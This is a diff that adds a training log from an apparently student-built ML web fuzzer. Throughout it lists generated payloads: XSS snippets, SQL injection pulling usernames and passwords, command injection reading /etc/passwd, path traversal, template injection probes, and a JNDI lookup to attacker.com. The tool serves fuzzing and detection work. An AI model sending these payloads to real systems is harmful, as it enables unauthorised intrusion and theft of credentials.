@@ -1,0 +1,344 @@
+2025-06-09 21:09:49,322 - INFO - Starting model training process...
+2025-06-09 21:09:49,347 - INFO - Dataset loaded successfully. Shape: (43, 7)
+2025-06-09 21:09:49,348 - INFO - Class distribution:
+label
+malicious     25
+suspicious    13
+safe           5
+Name: count, dtype: int64
+2025-06-09 21:09:52,889 - INFO - Discovered 25 common patterns
+2025-06-09 21:10:03,895 - INFO - 
+Generated payloads based on dataset patterns:
+2025-06-09 21:10:03,916 - INFO - Starting model training...
+2025-06-09 21:10:05,660 - INFO - Fine-tuning payload generator...
+2025-06-09 21:11:04,783 - INFO - Epoch 1, Loss: 9.5580
+2025-06-09 21:12:28,379 - INFO - Epoch 2, Loss: 4.4188
+2025-06-12 09:57:18,619 - INFO - Starting model training process...
+2025-06-12 09:57:18,639 - INFO - Dataset loaded successfully. Shape: (43, 7)
+2025-06-12 09:57:18,640 - INFO - Class distribution:
+label
+malicious     25
+suspicious    13
+safe           5
+Name: count, dtype: int64
+2025-06-12 09:58:07,660 - INFO - Discovered 25 common patterns
+2025-06-12 09:58:17,624 - INFO - 
+Generated payloads based on dataset patterns:
+2025-06-12 09:58:17,641 - INFO - Starting model training...
+2025-06-12 09:59:02,720 - INFO - Fine-tuning payload generator...
+2025-06-12 09:59:16,715 - INFO - Epoch 1, Loss: 9.6991
+2025-06-12 09:59:45,245 - INFO - Epoch 2, Loss: 4.4831
+2025-06-12 09:59:56,194 - INFO - Epoch 3, Loss: 3.5498
+2025-06-12 09:59:58,891 - INFO - Class distribution before resampling: {np.int64(0): np.int64(4), np.int64(1): np.int64(10), np.int64(2): np.int64(20)}
+2025-06-12 09:59:58,893 - INFO - Using RandomOverSampler (min samples < 5)
+2025-06-12 09:59:58,923 - INFO - Training Isolation Forest...
+2025-06-12 09:59:59,086 - INFO - Anomaly detection rate: 0.22
+2025-06-12 09:59:59,087 - INFO - Training Random Forest...
+2025-06-12 10:00:00,038 - INFO - 
+=== Model Evaluation ===
+2025-06-12 10:00:00,039 - INFO - 
+Isolation Forest Results:
+2025-06-12 10:00:00,044 - INFO - Anomaly detection rate: 0.22
+2025-06-12 10:00:00,044 - INFO - 
+Random Forest Results:
+2025-06-12 10:00:00,054 - INFO -               precision    recall  f1-score   support
+
+        safe       1.00      1.00      1.00         1
+  suspicious       1.00      1.00      1.00         3
+   malicious       1.00      1.00      1.00         5
+
+    accuracy                           1.00         9
+   macro avg       1.00      1.00      1.00         9
+weighted avg       1.00      1.00      1.00         9
+
+2025-06-12 10:00:00,054 - INFO - Confusion Matrix:
+2025-06-12 10:00:00,060 - INFO - [[1 0 0]
+ [0 3 0]
+ [0 0 5]]
+2025-06-12 10:00:00,061 - WARNING - No patterns learned - using fallback generation
+2025-06-12 10:00:00,061 - INFO - 
+Generated sample payloads:
+2025-06-12 10:00:00,061 - INFO - 1. ${jndi:ldap://attacker.com/x}
+2025-06-12 10:00:00,061 - INFO - 2. ../../etc/passwd
+2025-06-12 10:00:00,061 - INFO - 3. <script>alert(1)</script>
+2025-06-12 10:00:02,858 - INFO - 
+Models saved to model_versions/ directory
+2025-06-12 10:00:02,858 - INFO - 
+=== Model training completed successfully ===
+2025-06-12 10:00:02,858 - INFO - 
+Payload Generation Demo:
+2025-06-12 10:00:13,496 - INFO - 
+Generated payloads set 1:
+2025-06-12 10:00:13,496 - INFO - 1. "get_version", string )
+2025-06-12 10:00:13,496 - INFO - 2. gorithm|bogus|random|
+2025-06-12 10:00:23,106 - INFO - 
+Generated payloads set 2:
+2025-06-12 10:00:32,135 - INFO - 
+Generated payloads set 3:
+2025-06-12 10:00:32,136 - INFO - 1. x-net->test .
+2025-06-12 10:00:43,200 - INFO - Starting model training process...
+2025-06-12 10:00:43,210 - INFO - Dataset loaded successfully. Shape: (43, 7)
+2025-06-12 10:00:43,211 - INFO - Class distribution:
+label
+malicious     25
+suspicious    13
+safe           5
+Name: count, dtype: int64
+2025-06-12 10:01:50,178 - INFO - Starting payload generator test...
+2025-06-12 10:02:01,456 - INFO - 
+Generating payloads for: XSS attack
+2025-06-12 10:02:01,457 - ERROR - Failed to save payloads: [Errno 2] No such file or directory: 'C:\\Users\\LOKESH\\Desktop\\Web Application Fuzzer\\WEBFUZZER\\ml_payloads.txt'
+2025-06-12 10:02:01,457 - INFO - 1. <svg/onload=alert(1)>
+2025-06-12 10:02:01,457 - INFO - 2. javascript:alert(1)
+2025-06-12 10:02:01,457 - INFO - 3. `id`
+2025-06-12 10:02:01,457 - INFO - 
+Generating payloads for: SQL injection
+2025-06-12 10:02:01,457 - ERROR - Failed to save payloads: [Errno 2] No such file or directory: 'C:\\Users\\LOKESH\\Desktop\\Web Application Fuzzer\\WEBFUZZER\\ml_payloads.txt'
+2025-06-12 10:02:01,458 - INFO - 1. ' OR '1'='1
+2025-06-12 10:02:01,458 - INFO - 2. ${7*7}
+2025-06-12 10:02:01,458 - INFO - 3. | cat /etc/passwd
+2025-06-12 10:02:01,458 - INFO - 
+Generating payloads for: Path traversal
+2025-06-12 10:02:01,458 - ERROR - Failed to save payloads: [Errno 2] No such file or directory: 'C:\\Users\\LOKESH\\Desktop\\Web Application Fuzzer\\WEBFUZZER\\ml_payloads.txt'
+2025-06-12 10:02:01,458 - INFO - 1. ' OR '1'='1
+2025-06-12 10:02:01,459 - INFO - 2. <%= 7*7 %>
+2025-06-12 10:02:01,459 - INFO - 3. <body onload=alert(1)>
+2025-06-12 10:02:01,459 - INFO - 
+Generating payloads for: Command injection
+2025-06-12 10:02:01,459 - ERROR - Failed to save payloads: [Errno 2] No such file or directory: 'C:\\Users\\LOKESH\\Desktop\\Web Application Fuzzer\\WEBFUZZER\\ml_payloads.txt'
+2025-06-12 10:02:01,460 - INFO - 1. 1' ORDER BY 1--
+2025-06-12 10:02:01,460 - INFO - 2. ${7*7}
+2025-06-12 10:02:01,460 - INFO - 3. `id`
+2025-06-12 10:02:01,460 - INFO - 
+Generating payloads for: Server-side template injection
+2025-06-12 10:02:01,460 - ERROR - Failed to save payloads: [Errno 2] No such file or directory: 'C:\\Users\\LOKESH\\Desktop\\Web Application Fuzzer\\WEBFUZZER\\ml_payloads.txt'
+2025-06-12 10:02:01,461 - INFO - 1. ' OR '1'='1
+2025-06-12 10:02:01,461 - INFO - 2. {{7*7}}
+2025-06-12 10:02:01,461 - INFO - 3. admin'--
+2025-06-12 10:02:01,461 - INFO - 
+Payload generation test completed successfully
+2025-06-12 10:02:01,472 - INFO - Starting model training process...
+2025-06-12 10:02:01,475 - ERROR - Error loading dataset: Dataset file not found at C:\Users\LOKESH\Desktop\Web Application Fuzzer\WEBFUZZER\fuzzer_dataset.csv
+2025-06-12 10:02:01,475 - ERROR - Failed to load dataset - exiting
+2025-06-12 10:05:00,333 - INFO - Starting payload generator test...
+2025-06-12 10:05:03,323 - INFO - 
+Generating payloads for: XSS attack
+2025-06-12 10:05:03,330 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 10:05:03,330 - INFO - 1. <body onload=alert(1)>
+2025-06-12 10:05:03,331 - INFO - 2. ${7*7}
+2025-06-12 10:05:03,332 - INFO - 3. ../../../../etc/passwd
+2025-06-12 10:05:03,332 - INFO - 
+Generating payloads for: SQL injection
+2025-06-12 10:05:03,333 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 10:05:03,339 - INFO - 1. %2e%2e%2f%2e%2e%2fetc%2fpasswd
+2025-06-12 10:05:03,339 - INFO - 2. `id`
+2025-06-12 10:05:03,343 - INFO - 3. ' OR 1=1 --
+2025-06-12 10:05:03,343 - INFO - 
+Generating payloads for: Path traversal
+2025-06-12 10:05:03,346 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 10:05:03,346 - INFO - 1. $(whoami)
+2025-06-12 10:05:03,347 - INFO - 2. <img src=x onerror=alert(1)>
+2025-06-12 10:05:03,347 - INFO - 3. 1' ORDER BY 1--
+2025-06-12 10:05:03,347 - INFO - 
+Generating payloads for: Command injection
+2025-06-12 10:05:03,348 - INFO - Saved 1 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 10:05:03,349 - INFO - 1. 1' UNION SELECT null, username, password FROM users--
+2025-06-12 10:05:03,349 - INFO - 2. ${7*7}
+2025-06-12 10:05:03,351 - INFO - 3. ../../../../etc/passwd
+2025-06-12 10:05:03,351 - INFO - 
+Generating payloads for: Server-side template injection
+2025-06-12 10:05:03,351 - INFO - 1. ' OR 1=1 --
+2025-06-12 10:05:03,352 - INFO - 2. 1' UNION SELECT null, username, password FROM users--
+2025-06-12 10:05:03,354 - INFO - 3. ../../../../etc/passwd
+2025-06-12 10:05:03,355 - INFO - 
+Payload generation test completed successfully
+2025-06-12 10:05:03,362 - INFO - Starting model training process...
+2025-06-12 10:05:03,380 - INFO - Dataset loaded successfully. Shape: (43, 7)
+2025-06-12 10:05:03,381 - INFO - Class distribution:
+label
+malicious     25
+suspicious    13
+safe           5
+Name: count, dtype: int64
+2025-06-12 10:05:05,200 - INFO - Discovered 25 common patterns
+2025-06-12 10:05:05,201 - INFO - Saved 5 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 10:05:05,201 - INFO - 
+Generated payloads based on dataset patterns:
+2025-06-12 10:05:05,201 - INFO - 1. ' OR '1'='1
+2025-06-12 10:05:05,201 - INFO - 2. `id`
+2025-06-12 10:05:05,201 - INFO - 3. javascript:alert(1)
+2025-06-12 10:05:05,202 - INFO - 4. ..%2F..%2F..%2Fetc%2Fpasswd
+2025-06-12 10:05:05,202 - INFO - 5. <script>alert(1)</script>
+2025-06-12 10:05:05,214 - INFO - Starting model training...
+2025-06-12 10:05:06,706 - INFO - Fine-tuning payload generator...
+2025-06-12 10:05:18,729 - INFO - Epoch 1, Loss: 7.3583
+2025-06-12 10:05:31,443 - INFO - Epoch 2, Loss: 4.9528
+2025-06-12 10:05:41,609 - INFO - Epoch 3, Loss: 2.6622
+2025-06-12 10:05:50,634 - INFO - Epoch 4, Loss: 1.7459
+2025-06-12 10:05:59,488 - INFO - Epoch 5, Loss: 1.4047
+2025-06-12 10:06:00,789 - INFO - Class distribution before resampling: {np.int64(0): np.int64(4), np.int64(1): np.int64(10), np.int64(2): np.int64(20)}
+2025-06-12 10:06:00,789 - INFO - Using RandomOverSampler (min samples < 5)
+2025-06-12 10:06:00,843 - INFO - Training Isolation Forest...
+2025-06-12 10:06:00,981 - INFO - Anomaly detection rate: 0.22
+2025-06-12 10:06:00,982 - INFO - Training Random Forest...
+2025-06-12 10:06:01,860 - INFO - 
+=== Model Evaluation ===
+2025-06-12 10:06:01,861 - INFO - 
+Isolation Forest Results:
+2025-06-12 10:06:01,866 - INFO - Anomaly detection rate: 0.22
+2025-06-12 10:06:01,866 - INFO - 
+Random Forest Results:
+2025-06-12 10:06:01,877 - INFO -               precision    recall  f1-score   support
+
+        safe       1.00      1.00      1.00         1
+  suspicious       1.00      1.00      1.00         3
+   malicious       1.00      1.00      1.00         5
+
+    accuracy                           1.00         9
+   macro avg       1.00      1.00      1.00         9
+weighted avg       1.00      1.00      1.00         9
+
+2025-06-12 10:06:01,877 - INFO - Confusion Matrix:
+2025-06-12 10:06:01,886 - INFO - [[1 0 0]
+ [0 3 0]
+ [0 0 5]]
+2025-06-12 10:06:01,889 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 10:06:01,890 - INFO - 
+Generated sample payloads:
+2025-06-12 10:06:01,890 - INFO - 1. ' OR '1'='1
+2025-06-12 10:06:01,890 - INFO - 2. <img src=x onerror=alert(1)>
+2025-06-12 10:06:01,890 - INFO - 3. $(whoami)
+2025-06-12 10:06:03,805 - INFO - 
+Models saved to model_versions/ directory
+2025-06-12 10:06:03,806 - INFO - 
+=== Model training completed successfully ===
+2025-06-12 10:06:03,806 - INFO - 
+Payload Generation Demo:
+2025-06-12 10:06:03,807 - INFO - Saved 4 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 10:06:03,807 - INFO - 
+Generated payloads set 1:
+2025-06-12 10:06:03,807 - INFO - 1. <%= 7*7 %>
+2025-06-12 10:06:03,807 - INFO - 2. javascript:alert(1)
+2025-06-12 10:06:03,807 - INFO - 3. <img src=x onerror=alert(1)>
+2025-06-12 10:06:03,807 - INFO - 4. %2e%2e%2f%2e%2e%2fetc%2fpasswd
+2025-06-12 10:06:03,808 - INFO - 5. ../../../../etc/passwd
+2025-06-12 10:06:03,809 - INFO - Saved 2 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 10:06:03,809 - INFO - 
+Generated payloads set 2:
+2025-06-12 10:06:03,809 - INFO - 1. {{7*7}}
+2025-06-12 10:06:03,810 - INFO - 2. `id`
+2025-06-12 10:06:03,810 - INFO - 3. ..%2F..%2F..%2Fetc%2Fpasswd
+2025-06-12 10:06:03,810 - INFO - 4. $(whoami)
+2025-06-12 10:06:03,810 - INFO - 5. ../../../../etc/passwd
+2025-06-12 10:06:03,811 - INFO - Saved 1 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 10:06:03,811 - INFO - 
+Generated payloads set 3:
+2025-06-12 10:06:03,811 - INFO - 1. ' OR '1'='1
+2025-06-12 10:06:03,812 - INFO - 2. 1' UNION SELECT null, username, password FROM users--
+2025-06-12 10:06:03,812 - INFO - 3. ..%2F..%2F..%2Fetc%2Fpasswd
+2025-06-12 10:06:03,812 - INFO - 4. <img src=x onerror=alert(1)>
+2025-06-12 10:06:03,812 - INFO - 5. %2e%2e%2f%2e%2e%2fetc%2fpasswd
+2025-06-12 13:21:51,794 - INFO - Starting payload generator test...
+2025-06-12 13:21:53,532 - INFO - 
+Generating payloads for: XSS attack
+2025-06-12 13:21:53,535 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:21:53,537 - INFO - 1. ..%2F..%2F..%2Fetc%2Fpasswd
+2025-06-12 13:21:53,537 - INFO - 2. <script>alert(1)</script>
+2025-06-12 13:21:53,537 - INFO - 3. ; ls -la
+2025-06-12 13:21:53,538 - INFO - 
+Generating payloads for: SQL injection
+2025-06-12 13:21:53,540 - INFO - Saved 2 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:21:53,540 - INFO - 1. ${7*7}
+2025-06-12 13:21:53,541 - INFO - 2. ; ls -la
+2025-06-12 13:21:53,541 - INFO - 3. <body onload=alert(1)>
+2025-06-12 13:21:53,541 - INFO - 
+Generating payloads for: Path traversal
+2025-06-12 13:21:53,543 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:21:53,543 - INFO - 1. 1' ORDER BY 1--
+2025-06-12 13:21:53,544 - INFO - 2. 1' UNION SELECT null, username, password FROM users--
+2025-06-12 13:21:53,544 - INFO - 3. ../../../../etc/passwd
+2025-06-12 13:21:53,545 - INFO - 
+Generating payloads for: Command injection
+2025-06-12 13:21:53,547 - INFO - Saved 2 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:21:53,547 - INFO - 1. <%= 7*7 %>
+2025-06-12 13:21:53,548 - INFO - 2. | cat /etc/passwd
+2025-06-12 13:21:53,548 - INFO - 3. <body onload=alert(1)>
+2025-06-12 13:21:53,550 - INFO - 
+Generating payloads for: Server-side template injection
+2025-06-12 13:21:53,554 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:21:53,555 - INFO - 1. $(whoami)
+2025-06-12 13:21:53,556 - INFO - 2. `id`
+2025-06-12 13:21:53,556 - INFO - 3. ' OR 1=1 --
+2025-06-12 13:21:53,556 - INFO - 
+Payload generation test completed successfully
+2025-06-12 13:21:53,577 - INFO - Starting model training process...
+2025-06-12 13:21:53,610 - INFO - Dataset loaded successfully. Shape: (43, 7)
+2025-06-12 13:21:53,612 - INFO - Class distribution:
+label
+malicious     25
+suspicious    13
+safe           5
+Name: count, dtype: int64
+2025-06-12 13:21:55,221 - INFO - Discovered 25 common patterns
+2025-06-12 13:21:55,223 - INFO - Saved 5 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:21:55,224 - INFO - 
+Generated payloads based on dataset patterns:
+2025-06-12 13:21:55,224 - INFO - 1. ' OR '1'='1
+2025-06-12 13:21:55,225 - INFO - 2. <img src=x onerror=alert(1)>
+2025-06-12 13:21:55,225 - INFO - 3. %2e%2e%2f%2e%2e%2fetc%2fpasswd
+2025-06-12 13:21:55,225 - INFO - 4. 1' ORDER BY 1--
+2025-06-12 13:21:55,226 - INFO - 5. `id`
+2025-06-12 13:21:55,257 - INFO - Starting model training...
+2025-06-12 13:22:07,334 - INFO - Fine-tuning payload generator...
+2025-06-12 13:25:25,278 - INFO - Starting payload generator test...
+2025-06-12 13:25:27,336 - INFO - 
+Generating payloads for: XSS attack
+2025-06-12 13:25:27,339 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:25:27,339 - INFO - 1. ; ls -la
+2025-06-12 13:25:27,339 - INFO - 2. <%= 7*7 %>
+2025-06-12 13:25:27,340 - INFO - 3. | cat /etc/passwd
+2025-06-12 13:25:27,340 - INFO - 
+Generating payloads for: SQL injection
+2025-06-12 13:25:27,341 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:25:27,341 - INFO - 1. <body onload=alert(1)>
+2025-06-12 13:25:27,342 - INFO - 2. %2e%2e%2f%2e%2e%2fetc%2fpasswd
+2025-06-12 13:25:27,342 - INFO - 3. ' OR '1'='1
+2025-06-12 13:25:27,343 - INFO - 
+Generating payloads for: Path traversal
+2025-06-12 13:25:27,345 - INFO - Saved 3 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:25:27,345 - INFO - 1. ${7*7}
+2025-06-12 13:25:27,345 - INFO - 2. $(whoami)
+2025-06-12 13:25:27,346 - INFO - 3. 1' ORDER BY 1--
+2025-06-12 13:25:27,346 - INFO - 
+Generating payloads for: Command injection
+2025-06-12 13:25:27,348 - INFO - Saved 2 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:25:27,348 - INFO - 1. ' OR '1'='1
+2025-06-12 13:25:27,349 - INFO - 2. <script>alert(1)</script>
+2025-06-12 13:25:27,349 - INFO - 3. ..%2F..%2F..%2Fetc%2Fpasswd
+2025-06-12 13:25:27,349 - INFO - 
+Generating payloads for: Server-side template injection
+2025-06-12 13:25:27,351 - INFO - Saved 2 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:25:27,352 - INFO - 1. 1' UNION SELECT null, username, password FROM users--
+2025-06-12 13:25:27,352 - INFO - 2. 1' ORDER BY 1--
+2025-06-12 13:25:27,353 - INFO - 3. <img src=x onerror=alert(1)>
+2025-06-12 13:25:27,353 - INFO - 
+Payload generation test completed successfully
+2025-06-12 13:25:27,366 - INFO - Starting model training process...
+2025-06-12 13:25:27,394 - INFO - Dataset loaded successfully. Shape: (43, 7)
+2025-06-12 13:25:27,396 - INFO - Class distribution:
+label
+malicious     25
+suspicious    13
+safe           5
+Name: count, dtype: int64
+2025-06-12 13:25:29,000 - INFO - Discovered 25 common patterns
+2025-06-12 13:25:29,002 - INFO - Saved 5 new payloads to C:\Users\Siddhant\OneDrive\Desktop\ml code\WebFuzzer-main\ml_payloads.txt
+2025-06-12 13:25:29,004 - INFO - 
+Generated payloads based on dataset patterns:
+2025-06-12 13:25:29,004 - INFO - 1. ..%2F..%2F..%2Fetc%2Fpasswd
+2025-06-12 13:25:29,005 - INFO - 2. ' OR '1'='1
+2025-06-12 13:25:29,006 - INFO - 3. <%= 7*7 %>
+2025-06-12 13:25:29,006 - INFO - 4. 1' UNION SELECT null, username, password FROM users--
+2025-06-12 13:25:29,006 - INFO - 5. <img src=x onerror=alert(1)>
+2025-06-12 13:25:29,046 - INFO - Starting model training...
+2025-06-12 13:25:30,877 - INFO - Fine-tuning payload generator...
